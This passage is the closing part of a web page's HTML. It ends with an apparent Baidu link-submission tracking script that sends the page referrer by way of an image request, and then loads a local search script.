          var n = (String(curProtocol).toLowerCase() === 'https') ? "https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif" : "//api.share.baidu.com/s.gif";
          t ? (n += "?r=" + encodeURIComponent(document.referrer), r && (n += "&l=" + r)) : r && (n += "?l=" + r);
          var i = new Image;
          i.src = n
        }
      }(window);
    })();

  </script>
  <script src="/js/local-search.js"></script>
  <script src="/.js"></script>
</body>

</html>
